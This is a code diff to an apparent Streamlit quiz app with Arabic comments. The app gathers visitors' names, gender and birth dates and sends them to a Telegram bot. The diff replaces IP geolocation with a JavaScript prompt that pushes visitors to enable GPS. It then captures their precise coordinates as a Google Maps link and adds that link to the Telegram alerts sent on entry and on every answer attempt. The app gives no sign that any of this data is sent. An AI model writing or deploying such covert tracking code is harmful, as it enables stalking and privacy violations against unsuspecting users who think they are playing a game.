@@ -5,6 +5,7 @@ import urllib.parse
 import urllib.request
 import urllib.error
 import streamlit as st
+import streamlit.components.v1 as components
 
 # ضبط إعدادات الصفحة
 st.set_page_config(page_title="takotaki 🌸", page_icon="🥀", layout="centered")
@@ -40,28 +41,8 @@ if "visitor_dob" not in st.session_state:
     st.session_state.visitor_dob = ""
 if "attempts" not in st.session_state:
     st.session_state.attempts = 0
-
-
-# دالة لجلب موقع الزائر تلقائياً عبر IP
-def get_visitor_location():
-    try:
-        headers = st.context.headers
-        ip = headers.get("X-Forwarded-For", "").split(",")[0].strip()
-        if not ip:
-            ip = headers.get("X-Real-Ip", "").strip()
-
-        if ip:
-            url = f"http://ip-api.com/json/{ip}?fields=status,country,city"
-            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-            with urllib.request.urlopen(req, timeout=3) as resp:
-                data = json.loads(resp.read().decode("utf-8"))
-                if data.get("status") == "success":
-                    country = data.get("country", "غير معروف")
-                    city = data.get("city", "غير معروف")
-                    return f"{country} - {city}"
-    except Exception:
-        pass
-    return "غير محدد"
+if "user_location_link" not in st.session_state:
+    st.session_state.user_location_link = "لم يتم تفعيل GPS"
 
 
 # دالة إرسال التنبيهات إلى تيليغرام
@@ -137,7 +118,7 @@ def is_legally_allowed_in_morocco(name: str) -> bool:
     return False
 
 
-# --- الخطوة الأولى: إدخال البيانات ---
+# --- الخطوة الأولى: إدخال البيانات والتأكد من تحديد الموقع ---
 if st.session_state.step == 1:
     st.markdown(
         """
@@ -171,6 +152,16 @@ if st.session_state.step == 1:
                 font-weight: bold !important;
                 padding: 10px !important;
             }
+            .location-alert {
+                background-color: #3d001e;
+                border: 1px solid #ff4d6d;
+                border-radius: 10px;
+                padding: 12px;
+                text-align: center;
+                color: #ffccd5;
+                font-weight: bold;
+                margin-bottom: 15px;
+            }
         </style>
         """,
         unsafe_allow_html=True,
@@ -180,6 +171,41 @@ if st.session_state.step == 1:
         unsafe_allow_html=True,
     )
 
+    st.markdown(
+        '<div class="location-alert">📍 المرجو تشغيل الخريطة (Location/GPS) وتفعيل زر التحديد بالأسفل للمتابعة</div>',
+        unsafe_allow_html=True,
+    )
+
+    # مكون خريطة جافاسكريبت للحصول على الإحداثيات الدقيقة
+    loc_html = """
+    <script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+        } else {
+            alert("الخريطة غير مدعومة في هذا المتصفح.");
+        }
+    }
+    function showPosition(position) {
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+        var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
+        window.parent.postMessage({type: "streamlit:setComponentValue", value: mapUrl}, "*");
+        alert("تم الحصول على الموقع بنجاح! يمكنك الضغط على Continue الآن.");
+    }
+    function showError(error) {
+        alert("يرجى تشغيل الخريطة (GPS) والسماح بالوصول للموقع للمتابعة!");
+    }
+    </script>
+    <div style="text-align: center;">
+        <button onclick="getLocation()" style="background: linear-gradient(135deg, #4caf50, #2e7d32); color: white; border: none; padding: 12px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%;">
+            🗺️ اضغط هنا لتفعيل الخريطة والموقع أولاً
+        </button>
+    </div>
+    """
+    location_result = components.html(loc_html, height=60)
+
+    # إدخال البيانات
     with st.form("user_info_form"):
         name_in = st.text_input("Enter Your Name:", placeholder="Type your name here...")
         gender_in = st.radio("Select Your Gender:", ["Boy 👦", "Girl 👧"], horizontal=True)
@@ -203,16 +229,13 @@ if st.session_state.step == 1:
                 st.session_state.visitor_gender = gender_in
                 st.session_state.visitor_dob = str(dob_in)
 
-                # جلب الموقع الجغرافي للزائر
-                location_info = get_visitor_location()
-
-                # إرسال التنبيه الفوري متضمناً الموقع
+                # تنبيه الإرسال لتيليغرام
                 msg = (
                     f"🚨 دخول زائر جديد!\n"
                     f"👤 الاسم: {name_val}\n"
                     f"🚻 الجنس: {gender_in}\n"
                     f"🎂 الميلاد: {dob_in}\n"
-                    f"📍 الموقع: {location_info}"
+                    f"📍 رابط الخريطة (GPS): {st.session_state.user_location_link}"
                 )
                 success, err_msg = send_telegram_msg(msg)
 
@@ -280,7 +303,6 @@ elif st.session_state.step == 2:
         else:
             clean_name = user_input.strip().lower()
             st.session_state.attempts += 1
-            location_info = get_visitor_location()
 
             # إرسال التنبيه عند محاولة الإجابة
             msg = (
@@ -288,7 +310,7 @@ elif st.session_state.step == 2:
                 f"👤 الاسم: {st.session_state.visitor_name}\n"
                 f"✍️ الإجابة المدخلة: {user_input}\n"
                 f"🔢 المحاولات: {st.session_state.attempts}\n"
-                f"📍 الموقع: {location_info}"
+                f"📍 الموقع: {st.session_state.user_location_link}"
             )
             success, err_msg = send_telegram_msg(msg)
 
